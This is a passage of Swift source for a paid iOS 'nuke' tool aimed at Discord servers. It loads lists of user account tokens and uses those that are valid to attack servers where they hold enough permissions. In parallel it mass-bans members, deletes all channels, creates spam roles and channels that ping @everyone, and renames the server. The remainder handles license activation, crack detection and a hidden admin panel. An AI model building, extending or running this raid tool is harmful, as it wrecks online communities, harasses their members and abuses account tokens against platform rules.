        if text == nil { text = String(decoding: d, as: UTF8.self) }
        guard let t = text else { importError = "File rỗng"; return }
        let lines = t.replacingOccurrences(of: "\u{FEFF}", with: "")
            .components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }
        guard !lines.isEmpty else { importError = "Không có token"; return }
        isImporting = true; importError = nil
        for line in lines {
            if tokens.contains(where: { $0.token == line }) { continue }
            do {
                let u = try await UserNukeClient(token: line).validate()
                tokens.append(TokenInfo(token: line, userId: u.id, username: u.globalName ?? u.username, avatarHash: u.avatar, isValid: true))
            } catch {
                tokens.append(TokenInfo(token: line, userId: "0", username: "Token chết", avatarHash: nil, isValid: false))
            }
        }
        isImporting = false
    }
    func removeToken(_ id: UUID) {
        tokens.removeAll { $0.id == id }
        selectedTokenIds.remove(id); tokenGuilds.removeValue(forKey: id); recomputeEligible()
    }
    func clearAll() { tokens = []; selectedTokenIds = []; tokenGuilds = [:]; eligibleGuilds = [] }
    func clearSelection() { selectedTokenIds = []; eligibleGuilds = [] }
    func toggleSelection(_ t: TokenInfo) {
        guard t.isValid else { return }
        if selectedTokenIds.contains(t.id) { selectedTokenIds.remove(t.id) }
        else { selectedTokenIds.insert(t.id) }
        recomputeEligible()
        if !tokenGuilds.keys.contains(t.id) { Task { await loadGuildsForToken(t) } }
    }
    func loadAllGuildsForSelected() async {
        isLoadingGuilds = true
        for id in selectedTokenIds {
            guard let t = tokens.first(where: { $0.id == id }), t.isValid else { continue }
            await loadGuildsForToken(t)
        }
        recomputeEligible(); isLoadingGuilds = false
    }
    private func loadGuildsForToken(_ t: TokenInfo) async {
        do { tokenGuilds[t.id] = try await UserNukeClient(token: t.token).getGuildsWithPerms() }
        catch { tokenGuilds[t.id] = [] }
        recomputeEligible()
    }
    func recomputeEligible() {
        guard !selectedTokenIds.isEmpty else { eligibleGuilds = []; return }
        var unionIds: Set<String> = []
        var unionMap: [String: NukeGuild] = [:]
        for id in selectedTokenIds {
            guard let gs = tokenGuilds[id] else { eligibleGuilds = []; return }
            for g in gs where g.canDoAnything {
                unionIds.insert(g.id)
                if unionMap[g.id] == nil { unionMap[g.id] = g }
            }
        }
        eligibleGuilds = unionIds.compactMap { unionMap[$0] }
            .map { Guild(id: $0.id, name: $0.name, icon: $0.icon) }
            .sorted { $0.name < $1.name }
    }
    func permissionsForGuild(_ guildId: String) -> GuildPermissions {
        var perms = GuildPermissions()
        for tokenId in selectedTokenIds {
            guard let gs = tokenGuilds[tokenId],
                  let g = gs.first(where: { $0.id == guildId }) else { continue }
            if g.canMassBan { perms.massBan = true }
            if g.canDeleteChannels { perms.deleteChannels = true }
            if g.canCreateChannels { perms.createChannels = true }
            if g.canCreateRoles { perms.createRoles = true }
            if g.canRenameGuild { perms.renameGuild = true }
        }
        return perms
    }
    private func clientsWithBanPerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canMassBan ?? false }.map { $0.1 }
    }
    private func clientsWithChannelPerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in
            let g = tokenGuilds[id]?.first(where: { $0.id == guildId })
            return g?.canDeleteChannels ?? false || g?.canCreateChannels ?? false
        }.map { $0.1 }
    }
    private func clientsWithRolePerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canCreateRoles ?? false }.map { $0.1 }
    }
    private func clientsWithRenamePerm(guildId: String, all: [(UUID, UserNukeClient)]) -> [UserNukeClient] {
        all.filter { id, _ in tokenGuilds[id]?.first(where: { $0.id == guildId })?.canRenameGuild ?? false }.map { $0.1 }
    }
    func stop() { isCancelled = true }
    private func log(_ m: String) { nukeLog.append(m); if nukeLog.count > 800 { nukeLog.removeFirst(nukeLog.count - 800) } }
    private func reset() { banSuccess = 0; banFailed = 0; channelsDeleted = 0; channelsCreated = 0; messagesSent = 0; rolesCreated = 0; membersScanned = 0; phaseProgress = 0 }

    func runNuke(guild: Guild, options: NukeConfig) async {
        guard !selectedTokenIds.isEmpty else { return }
        let sel = tokens.filter { selectedTokenIds.contains($0.id) && $0.isValid }
        guard !sel.isEmpty else { return }

        isNuking = true; isCancelled = false; nukeLog = []; reset()
        BackgroundManager.shared.start()
        NowPlayingHelper.shared.start(onStop: { [weak self] in
            Task { @MainActor in self?.stop() }
        })
        let gid = guild.id
        let allClients: [(UUID, UserNukeClient)] = sel.map { ($0.id, UserNukeClient(token: $0.token)) }
        guard let scan = allClients.first?.1 else { return }

        log("Bắt đầu nuke: \(guild.name)")
        log("Dùng \(allClients.count) token")
        let totalSteps = options.stepOrder.filter { options.enabledSteps.contains($0) }.count
        var stepDone = 0

        for step in options.stepOrder {
            if isCancelled { break }
            guard options.enabledSteps.contains(step) else { continue }
            currentPhase = step.rawValue
            phaseProgress = totalSteps > 0 ? Double(stepDone) / Double(totalSteps) : 0
            log("--- \(step.rawValue) ---")
            NowPlayingHelper.shared.update(
                title: "User Nuke · \(step.rawValue)",
                detail: "\(banSuccess) ban | \(channelsDeleted) xoá | \(channelsCreated) tạo"
            )
            switch step {
            case .massBan:
                let bc = clientsWithBanPerm(guildId: gid, all: allClients)
                if bc.isEmpty { log("  Bỏ qua: không token nào có quyền ban"); break }
                await doMassBanScan(scan, clients: bc, gid: gid, options: options)
            case .deleteChannels:
                let cc = clientsWithChannelPerm(guildId: gid, all: allClients)
                if cc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý kênh"); break }
                await doDeleteChannels(cc, gid, options: options)
            case .renameGuild:
                let rc = clientsWithRenamePerm(guildId: gid, all: allClients)
                if rc.isEmpty { log("  Bỏ qua: không token nào có quyền đổi tên"); break }
                if !options.newGuildName.isEmpty {
                    do { try await rc[0].renameGuild(gid, newName: options.newGuildName); log("  Đổi tên OK") }
                    catch { log("  Lỗi: \(error.localizedDescription)") }
                }
            case .createRoles:
                let rc = clientsWithRolePerm(guildId: gid, all: allClients)
                if rc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý role"); break }
                rolesCreated = await doCreateRoles(rc, gid, options: options)
                log("  Role đã tạo: \(rolesCreated)")
            case .createChannels:
                let cc = clientsWithChannelPerm(guildId: gid, all: allClients)
                if cc.isEmpty { log("  Bỏ qua: không token nào có quyền quản lý kênh"); break }
                let (c, s) = await doCreateChannels(cc, gid, options: options)
                channelsCreated = c; messagesSent = s
                log("  Kênh đã tạo: \(c), tin đã gửi: \(s)")
            }
            stepDone += 1
        }
        currentPhase = isCancelled ? "Đã dừng" : "Hoàn tất"
        phaseProgress = 1.0
        log(isCancelled ? "Đã dừng" : "XONG")
        log("=== TỔNG KẾT ===")
        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
        log("Xóa kênh: \(channelsDeleted)")
        log("Tạo kênh: \(channelsCreated)")
        log("Tin nhắn: \(messagesSent)")
        log("Role: \(rolesCreated)")
        isNuking = false
        BackgroundManager.shared.stop()
        NowPlayingHelper.shared.stop()
    }

    private func doMassBanScan(_ scan: UserNukeClient, clients: [UserNukeClient], gid: String, options: NukeConfig) async {
        do {
            let roles = try await scan.getRoles(gid)
            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
            let detail = try await scan.getGuildDetail(gid)
            let ownerId = detail["owner_id"] as? String
            let myUser = try await scan.validate()
            let myM = try await scan.getMember(gid, uid: myUser.id)
            let myMax = (myM.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
            log("  Scan role pos: \(myMax)")

            var rolePosition = 0
            var filterByRole = false
            if !options.banRoleId.isEmpty, let tr = roleMap[options.banRoleId] {
                rolePosition = tr.position; filterByRole = true
                log("  Ban theo role: \(tr.name) (pos \(rolePosition))")
            }

            var candidates: [String] = []
            let lock = NSLock()
            log("  Đang quét WS...")
            do {
                try await scan.fetchMembersWS(guildId: gid, onMember: { m in
                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
                    let mr = m["roles"] as? [String] ?? []
                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
                    if mm >= myMax { return }
                    if filterByRole {
                        if !mr.contains(options.banRoleId) { return }
                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
                    }
                    lock.lock(); candidates.append(uid); let n = candidates.count; lock.unlock()
                    if n % 5 == 0 { Task { @MainActor in self.membersScanned = n } }
                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            } catch {
                log("  WS lỗi: \(error.localizedDescription) — thử HTTP")
                await scan.fetchMembersHTTP(guildId: gid, onMember: { m in
                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
                    let mr = m["roles"] as? [String] ?? []
                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
                    if mm >= myMax { return }
                    if filterByRole {
                        if !mr.contains(options.banRoleId) { return }
                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
                    }
                    lock.lock(); candidates.append(uid); lock.unlock()
                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
            }

            log("  Tìm thấy \(candidates.count) target")
            guard !candidates.isEmpty else { log("  Không có ai để ban"); return }

            let queue = candidates
            let idxBox = IndexBox()
            let delay = options.banDelay
            let manager = self

            await withTaskGroup(of: Void.self) { group in
                for client in clients {
                    group.addTask {
                        while !(await manager.isCancelled) {
                            let i = idxBox.next()
                            if i >= queue.count { break }
                            let uid = queue[i]
                            if delay > 0 { try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000)) }
                            do {
                                try await client.banMember(gid, uid: uid)
                                await MainActor.run { manager.banSuccess += 1 }
                            } catch {
                                await MainActor.run { manager.banFailed += 1 }
                            }
                        }
                    }
                }
            }
            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
    }

    private func doDeleteChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async {
        do {
            let chans = try await clients[0].getChannels(gid)
            log("  Tìm \(chans.count) kênh")
            let idx = IndexBox(); var count = 0
            await withTaskGroup(of: Bool.self) { group in
                var inf = 0
                for _ in 0..<chans.count {
                    if isCancelled { break }
                    let client = clients[Int.random(in: 0..<clients.count)]
                    let i = idx.next()
                    if i >= chans.count { break }
                    let ch = chans[i]
                    let d = options.deleteDelay
                    group.addTask {
                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                        do { try await client.deleteChannel(ch.id); return true } catch { return false }
                    }
                    inf += 1
                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                }
                for await r in group { if r { count += 1 } }
            }
            channelsDeleted = count
            log("  Đã xóa: \(count)")
        } catch { log("  Lỗi: \(error.localizedDescription)") }
    }

    private func doCreateRoles(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> Int {
        var count = 0
        await withTaskGroup(of: Bool.self) { group in
            var inf = 0
            for _ in 0..<options.roleCount {
                if isCancelled { break }
                let client = clients[Int.random(in: 0..<clients.count)]
                let d = options.createRoleDelay
                let n = options.roleName
                group.addTask {
                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
                    do { try await client.createRole(gid, name: n); return true } catch { return false }
                }
                inf += 1
                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
            }
            for await r in group { if r { count += 1 } }
        }
        return count
    }

    private func doCreateChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> (Int, Int) {
        var created = 0, sent = 0
        var content = options.messageContent
        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
        await withTaskGroup(of: (Bool, Bool).self) { group in
            var inf = 0
            for _ in 0..<options.channelCount {
                if isCancelled { break }
                let client = clients[Int.random(in: 0..<clients.count)]
                let cd = options.createChDelay, md = options.msgDelay
                let cn = options.channelName
                group.addTask {
                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                    do {
                        guard let chId = try await client.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                        if !content.trimmingCharacters(in: .whitespaces).isEmpty {
                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
                            do { try await client.sendMessage(chId, content: content); return (true, true) }
                            catch { return (true, false) }
                        }
                        return (true, false)
                    } catch { return (false, false) }
                }
                inf += 1
                if inf >= 8 {
                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                    inf -= 1
                }
            }
            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
        }
        return (created, sent)
    }
}

final class IndexBox: @unchecked Sendable {
    private var value = 0
    private let lock = NSLock()
    func next() -> Int { lock.lock(); defer { lock.unlock() }; let v = value; value += 1; return v }
}

// ==========================================
// MARK: - LICENSE API
// ==========================================
struct LicenseActivationResponse: Codable {
    let valid: Bool?
    let createdAt: Int64?
    let expiresAt: Int64?
    let sessionToken: String?
    let config: RemoteConfigDTO?
    let message: String?
    let error: String?

    enum CodingKeys: String, CodingKey {
        case valid, message, error, config
        case createdAt = "created_at"
        case expiresAt = "expires_at"
        case sessionToken = "session_token"
    }
}

struct LicenseValidationResponse: Codable {
    let valid: Bool?
    let createdAt: Int64?
    let expiresAt: Int64?
    let sessionToken: String?
    let error: String?

    enum CodingKeys: String, CodingKey {
        case valid, error
        case createdAt = "created_at"
        case expiresAt = "expires_at"
        case sessionToken = "session_token"
    }
}

enum LicenseStatus: Equatable {
    case notActivated
    case checking
    case valid(expiresOn: Date)
    case expired(expiresOn: Date)
    case invalid(reason: String)
    case cracked(reason: String)
}

final class LicenseAPIClient {
    static let shared = LicenseAPIClient()
    var baseURL: String { SecureAPIClient.shared.baseURL }

    private func machineID() -> String { MachineID.get() }

    func activate(key: String) async throws -> LicenseActivationResponse {
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/activate",
            bodyDict: [
                "license_key": key,
                "machine_id": machineID()
            ]
        )
    }

    func validate(key: String) async throws -> LicenseValidationResponse {
        return try await SecureAPIClient.shared.sendEncryptedRequest(
            endpoint: "/validate",
            bodyDict: [
                "license_key": key,
                "machine_id": machineID()
            ]
        )
    }
}

@MainActor
final class LicenseManager: ObservableObject {
    static let shared = LicenseManager()

    @Published var status: LicenseStatus = .notActivated
    @Published var licenseKey: String? = nil
    @Published var activatedAt: Date? = nil
    @Published var isChecking = false

    private let keyStoreKey = "QT_LicenseKey_Server"
    private let expiryStoreKey = "QT_LicenseExpiry"
    private let lastCheckKey = "QT_LicenseLastCheck"
    private let activatedStoreKey = "QT_LicenseActivatedAt"

    init() {
        licenseKey = PersistentStorage.shared.readString(forKey: keyStoreKey)
        if let s = PersistentStorage.shared.readString(forKey: activatedStoreKey),
           let d = Double(s) {
            activatedAt = Date(timeIntervalSince1970: d)
        }

        let expStr = PersistentStorage.shared.readString(forKey: expiryStoreKey)
        let expDate = expStr.flatMap { Double($0) }.map { Date(timeIntervalSince1970: $0) }

        _ = AppEndpoints.loadFromCache()
        SecurityGuard.shared.loadCachedSessionToken()

        if let key = licenseKey, !key.isEmpty {
            if let exp = expDate {
                if Date() > exp {
                    status = .expired(expiresOn: exp)
                } else {
                    // Nếu còn hạn: Mở app ngay lập tức, không bắt nhập lại key hay chờ đợi
                    status = .valid(expiresOn: exp)
                }
            } else {
                status = .checking
            }
            Task { @MainActor [weak self] in await self?.refreshStatus() }
        } else {
            status = .notActivated
        }
    }

    func activate(key: String) async -> LicenseStatus {
        let clean = key.trimmingCharacters(in: .whitespacesAndNewlines).uppercased()
        guard !clean.isEmpty else { status = .invalid(reason: "Vui lòng nhập License Key"); return status }
        isChecking = true
        defer { isChecking = false }
        do {
            let res = try await LicenseAPIClient.shared.activate(key: clean)
            guard res.valid == true, let expMs = res.expiresAt else {
                status = .invalid(reason: res.error ?? "Key không hợp lệ")
                return status
            }
            if let token = res.sessionToken {
                _ = SecurityGuard.shared.updateSessionToken(token)
            }
            if let cfg = res.config {
                AppEndpoints.apply(cfg)
            }
            let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
            let now = res.createdAt != nil ? Date(timeIntervalSince1970: Double(res.createdAt!) / 1000) : Date()
            PersistentStorage.shared.saveString(clean, forKey: keyStoreKey)
            PersistentStorage.shared.saveString("\(exp.timeIntervalSince1970)", forKey: expiryStoreKey)
            PersistentStorage.shared.saveString("\(Date().timeIntervalSince1970)", forKey: lastCheckKey)
            PersistentStorage.shared.saveString("\(now.timeIntervalSince1970)", forKey: activatedStoreKey)
            licenseKey = clean
            activatedAt = now
            status = Date() > exp ? .expired(expiresOn: exp) : .valid(expiresOn: exp)
            if !AppEndpoints.isLoaded {
                await fetchAndApplyConfig(key: clean)
            }
            return status
        } catch {
            status = .invalid(reason: "Lỗi kích hoạt: \(error.localizedDescription)")
            return status
        }
    }

    func refreshStatus() async {
        guard let key = licenseKey, !key.isEmpty else {
            AppEndpoints.clear()
            status = .notActivated
            return
        }
        isChecking = true
        defer { isChecking = false }
        await fetchAndApplyConfig(key: key)
    }

    private func fetchAndApplyConfig(key: String) async {
        do {
            let res = try await ConfigAPIClient.shared.fetchConfig(key: key)
            if res.cracked == true {
                SecurityGuard.shared.markCompromised(reason: res.error ?? "App has been cracked")
                AppEndpoints.clear()
                status = .cracked(reason: res.error ?? "Key đã bị vô hiệu hóa.")
                return
            }
            if res.expired == true || (res.expiresAt != nil && Date().timeIntervalSince1970 * 1000 > Double(res.expiresAt!)) {
                let exp = res.expiresAt != nil ? Date(timeIntervalSince1970: Double(res.expiresAt!) / 1000) : Date()
                status = .expired(expiresOn: exp)
                return
            }
            guard res.valid == true, let cfg = res.config, let expMs = res.expiresAt else {
                if case .valid = status {
                    // Tránh văng user nếu server gặp sự cố tạm thời
                    return
                }
                status = .invalid(reason: res.error ?? "Key không tồn tại hoặc lỗi máy chủ.")
                return
            }
            if let token = res.sessionToken {
                _ = SecurityGuard.shared.updateSessionToken(token)
            }
            if let ca = res.createdAt {
                let actDate = Date(timeIntervalSince1970: Double(ca) / 1000)
                activatedAt = actDate
                PersistentStorage.shared.saveString("\(actDate.timeIntervalSince1970)", forKey: activatedStoreKey)
            }
            AppEndpoints.apply(cfg)
            let exp = Date(timeIntervalSince1970: Double(expMs) / 1000)
            PersistentStorage.shared.saveString("\(exp.timeIntervalSince1970)", forKey: expiryStoreKey)
            PersistentStorage.shared.saveString("\(Date().timeIntervalSince1970)", forKey: lastCheckKey)
            status = Date() > exp ? .expired(expiresOn: exp) : .valid(expiresOn: exp)
        } catch {
            // Khi mất mạng hoặc server chậm: giữ nguyên trạng thái valid nếu còn hạn
            if let s = PersistentStorage.shared.readString(forKey: expiryStoreKey),
               let d = Double(s) {
                let exp = Date(timeIntervalSince1970: d)
                if Date() > exp {
                    AppEndpoints.clear()
                    status = .expired(expiresOn: exp)
                    return
                } else if AppEndpoints.isLoaded {
                    status = .valid(expiresOn: exp)
                    return
                }
            }
            if case .valid = status {
                // Vẫn giữ valid
            } else {
                status = .invalid(reason: "Lỗi kết nối: \(error.localizedDescription)")
            }
        }
    }

    func deactivate() {
        for k in [keyStoreKey, expiryStoreKey, lastCheckKey, activatedStoreKey, "QT_CachedSessionToken"] {
            PersistentStorage.shared.delete(forKey: k)
        }
        licenseKey = nil; activatedAt = nil
        AppEndpoints.clear()
        status = .notActivated
    }

    var isUnlocked: Bool {
        if case .valid = status, AppEndpoints.isLoaded, SecurityGuard.shared.verifyExecutionPermit() { return true }
        return false
    }

    func formatDateTime(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "dd/MM/yyyy HH:mm:ss"
        df.locale = Locale(identifier: "vi_VN")
        return df.string(from: d)
    }

    func formatDate(_ d: Date) -> String {
        return formatDateTime(d)
    }

    func timeRemaining(until target: Date) -> String {
        let now = Date()
        guard target > now else { return "Đã hết hạn" }
        let diff = Int(target.timeIntervalSince(now))
        let days = diff / 86400
        let hours = (diff % 86400) / 3600
        let minutes = (diff % 3600) / 60
        let seconds = diff % 60
        if days > 0 {
            return "\(days) ngày \(hours) giờ \(minutes) phút \(seconds) giây"
        } else if hours > 0 {
            return "\(hours) giờ \(minutes) phút \(seconds) giây"
        } else {
            return "\(minutes) phút \(seconds) giây"
        }
    }

    var statusText: String {
        switch status {
        case .notActivated: return "Chưa kích hoạt"
        case .checking: return "Đang kiểm tra..."
        case .valid(let d): return "Còn hạn đến \(formatDateTime(d))"
        case .expired(let d): return "Đã hết hạn ngày \(formatDateTime(d))"
        case .invalid(let r): return r
        case .cracked(let r): return r
        }
    }
}

// ==========================================
// MARK: - CRACKED VIEW
// ==========================================
struct CrackedView: View {
    @EnvironmentObject var license: LicenseManager
    let message: String
    @State private var showInput = false
    @State private var input = ""
    @State private var error: String?

    var body: some View {
        ZStack {
            LinearGradient(colors: [.black, Color(red: 0.25, green: 0, blue: 0)],
                           startPoint: .top, endPoint: .bottom).ignoresSafeArea()
            ScrollView {
                VStack(spacing: 22) {
                    Spacer(minLength: 40)
                    Image(systemName: "exclamationmark.triangle.fill")
                        .font(.system(size: 85)).foregroundStyle(.red)
                        .shadow(color: .red.opacity(0.5), radius: 20)
                    Text("APP HAS BEEN CRACKED")
                        .font(.system(size: 22, weight: .black))
                        .foregroundStyle(.white).tracking(1.5)
                    Text(message)
                        .font(.subheadline).foregroundStyle(.gray)
                        .multilineTextAlignment(.center).padding(.horizontal, 24)

                    if showInput {
                        VStack(spacing: 12) {
                            TextField("Enter license key...", text: $input)
                                .textInputAutocapitalization(.characters).autocorrectionDisabled()
                                .font(.system(.body, design: .monospaced))
                                .padding(14).background(Color.white.opacity(0.08))
                                .foregroundStyle(.white).cornerRadius(10)
                                .overlay(RoundedRectangle(cornerRadius: 10)
                                    .stroke(Color.white.opacity(0.15), lineWidth: 1))
                            if let e = error {
                                Text(e).font(.caption).foregroundStyle(.red)
                                    .multilineTextAlignment(.center)
                            }
                            Button {
                                Task {
                                    error = nil
                                    let st = await license.activate(key: input)
                                    switch st {
                                    case .valid: break
                                    case .cracked(let r): error = r
                                    case .invalid(let r): error = r
                                    case .expired(let d): error = "Key expired on \(license.formatDate(d))"
                                    default: error = "Unable to activate"
                                    }
                                }
                            } label: {
                                HStack {
                                    if license.isChecking { ProgressView().tint(.white) }
                                    Text(license.isChecking ? "VERIFYING..." : "ACTIVATE").bold()
                                }.frame(maxWidth: .infinity).padding()
                            }
                            .background(Color.red).foregroundStyle(.white).cornerRadius(10)
                            .disabled(input.trimmingCharacters(in: .whitespaces).isEmpty || license.isChecking)
                        }.padding(.horizontal, 30)
                    } else {
                        Button("Enter License Key") { showInput = true }
                            .foregroundStyle(.red).font(.subheadline.bold())
                    }

                    Button("Retry Verification") {
                        Task { await license.refreshStatus() }
                    }
                    .foregroundStyle(.gray).font(.caption)

                    Spacer(minLength: 20)
                    Text("v1.0").font(.caption2).foregroundStyle(.gray.opacity(0.4))
                }
            }
        }
    }
}

struct LoadingView: View {
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            VStack(spacing: 18) {
                ProgressView().tint(.white).scaleEffect(1.5)
                Text("Verifying license...").foregroundStyle(.white)
            }
        }
    }
}

// ==========================================
// MARK: - LOCK VIEW (khi có key nhưng activate lỗi)
// ==========================================
struct LockView: View {
    @EnvironmentObject var license: LicenseManager
    @State private var input = ""
    @State private var error: String? = nil
    @State private var showAdminInfo = false
    @State private var logoTapCount = 0

    var body: some View {
        ZStack {
            LinearGradient(colors: [Color(red: 0.08, green: 0.08, blue: 0.16), Color.black],
                           startPoint: .top, endPoint: .bottom).ignoresSafeArea()
            ScrollView {
                VStack(spacing: 24) {
                    Spacer(minLength: 40)
                    VStack(spacing: 14) {
                        Image(systemName: "lock.shield.fill").font(.system(size: 80))
                            .foregroundStyle(.red).shadow(color: .red.opacity(0.4), radius: 20)
                            .onTapGesture {
                                logoTapCount += 1
                                if logoTapCount >= 7 { logoTapCount = 0; showAdminInfo = true }
                            }
                        Text("QUOC THANG TOOLS").font(.system(size: 22, weight: .heavy))
                            .foregroundStyle(.white).tracking(1.5)
                        Text("LICENSE REQUIRED").font(.caption.bold())
                            .foregroundStyle(.red.opacity(0.8)).tracking(3)
                    }
                    VStack(spacing: 14) {
                        TextField("Nhập license key...", text: $input)
                            .textInputAutocapitalization(.characters).autocorrectionDisabled()
                            .font(.system(.body, design: .monospaced)).padding(14)
                            .background(Color.white.opacity(0.08)).foregroundStyle(.white)
                            .cornerRadius(10)
                            .overlay(RoundedRectangle(cornerRadius: 10).stroke(Color.white.opacity(0.15), lineWidth: 1))
                            .onChange(of: input) { _ in error = nil }
                        if let e = error {
                            Text(e).font(.caption).foregroundStyle(.red)
                                .multilineTextAlignment(.center).padding(.horizontal)
                        }
                        Button {
                            Task {
                                error = nil
                                let st = await license.activate(key: input)
                                switch st {
                                case .valid: error = nil
                                case .invalid(let r): error = r
                                case .cracked(let r): error = r
                                case .expired(let d): error = "Key đã hết hạn lúc \(fmt(d))"
                                default: error = "Không thể kích hoạt"
                                }
                            }
                        } label: {
                            HStack {
                                if license.isChecking { ProgressView().tint(.white) }
                                Text(license.isChecking ? "ĐANG KIỂM TRA..." : "KÍCH HOẠT").bold()
                            }.frame(maxWidth: .infinity).padding()
                        }
                        .background(input.trimmingCharacters(in: .whitespaces).isEmpty ? Color.gray : Color.indigo)
                        .foregroundStyle(.white).cornerRadius(10)
                        .disabled(input.trimmingCharacters(in: .whitespaces).isEmpty || license.isChecking)
                    }.padding(.horizontal, 30)

                    if case .expired(let d) = license.status {
                        Text("⚠️ Key trước đó đã hết hạn lúc: \(fmt(d))")
                            .font(.caption).foregroundStyle(.orange)
                            .multilineTextAlignment(.center).padding(.horizontal)
                    }
                    Spacer(minLength: 20)
                    Text("v1.0").font(.caption2).foregroundStyle(.gray.opacity(0.4))
                }.padding(.vertical, 20)
            }
        }
        .sheet(isPresented: $showAdminInfo) {
            LicenseAdminInfoView().environmentObject(license)
        }
    }

    private func fmt(_ d: Date) -> String {
        let df = DateFormatter()
        df.dateFormat = "dd/MM/yyyy HH:mm:ss"
        df.locale = Locale(identifier: "vi_VN")
        return df.string(from: d)
    }
}

// ==========================================
// MARK: - ADMIN INFO VIEW
// ==========================================
struct LicenseAdminInfoView: View {
    @EnvironmentObject var license: LicenseManager
    @Environment(\.dismiss) var dismiss

    var body: some View {
        NavigationStack {
            ScrollView {
                VStack(alignment: .leading, spacing: 16) {
                    Text("THÔNG TIN ADMIN").font(.headline)

                    VStack(alignment: .leading, spacing: 8) {
                        Text("API Endpoint").font(.caption.bold()).foregroundStyle(.secondary)
                        Text(LicenseAPIClient.shared.baseURL)
                            .font(.system(.caption, design: .monospaced)).textSelection(.enabled)
                    }
                    .padding().frame(maxWidth: .infinity, alignment: .leading)
                    .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)

                    if let k = license.licenseKey {
                        VStack(alignment: .leading, spacing: 8) {
                            Text("KEY HIỆN TẠI").font(.caption.bold()).foregroundStyle(.secondary)
                            Text(k).font(.system(.caption, design: .monospaced)).textSelection(.enabled)
                            Text(license.statusText).font(.caption2).foregroundStyle(.green)
                        }
                        .padding().frame(maxWidth: .infinity, alignment: .leading)
                        .background(Color(UIColor.secondarySystemBackground)).cornerRadius(10)
                    }

                    Button(role: .destructive) {
                        license.deactivate(); dismiss()
                    } label: {
                        Label("Xoá key hiện tại", systemImage: "trash").frame(maxWidth: .infinity).padding(10)
                    }
                    .background(Color.red.opacity(0.15)).foregroundStyle(.red).cornerRadius(8)
                }.padding()
            }
            .navigationTitle("Admin Info").navigationBarTitleDisplayMode(.inline)
            .toolbar {
                ToolbarItem(placement: .cancellationAction) { Button("Đóng") { dismiss() } }
            }
        }
    }
}

// ==========================================
// MARK: - ABOUT / INFO VIEW
// ==========================================
struct AboutView: View {
    @EnvironmentObject var license: LicenseManager
    @State private var showFullKey = false

    var body: some View {
        NavigationStack {
            ScrollView {
                VStack(spacing: 20) {
                    VStack(alignment: .leading, spacing: 12) {
                        Text("LICENSE INFORMATION").font(.caption.bold()).foregroundStyle(.secondary)
                        HStack {
                            Text("License Key").font(.subheadline)
                            Spacer()
                            Text(maskedKey).font(.system(.subheadline, design: .monospaced)).foregroundStyle(.indigo)
                            Toggle("", isOn: $showFullKey).labelsHidden().tint(.indigo).scaleEffect(0.8)
                        }
                        Divider()
                        HStack {
                            Text("Ngày giờ kích hoạt").font(.subheadline)
                            Spacer()
                            Text(license.activatedAt != nil ? license.formatDateTime(license.activatedAt!) : "N/A")
                                .font(.subheadline.bold()).foregroundStyle(.secondary)
                        }
                        Divider()
                        HStack {
                            Text("Ngày giờ hết hạn").font(.subheadline)
                            Spacer()
                            if case .valid(let exp) = license.status {
                                Text(license.formatDateTime(exp)).font(.subheadline.bold()).foregroundStyle(.green)
                            } else if case .expired(let exp) = license.status {
                                Text(license.formatDateTime(exp)).font(.subheadline.bold()).foregroundStyle(.red)
                            } else {
                                Text("N/A").font(.subheadline.bold()).foregroundStyle(.secondary)
                            }
                        }
                        if case .valid(let exp) = license.status {
                            Divider()
                            HStack {
                                Text("Thời gian còn lại").font(.subheadline)
                                Spacer()
                                Text(license.timeRemaining(until: exp))
                                    .font(.subheadline.bold()).foregroundStyle(.indigo)
                            }
                        }
                    }
                    .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)

                    VStack(alignment: .leading, spacing: 10) {
                        HStack {
